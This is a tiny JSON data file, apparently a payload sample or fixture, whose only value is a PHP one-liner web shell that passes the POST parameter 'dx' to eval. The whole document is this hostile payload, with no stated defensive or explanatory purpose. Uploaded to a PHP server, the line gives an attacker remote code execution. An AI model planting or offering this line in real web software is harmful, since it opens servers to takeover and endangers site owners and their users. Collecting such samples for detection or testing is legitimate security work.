{
    "a": "<?php eval($_POST[dx]); ?>"
}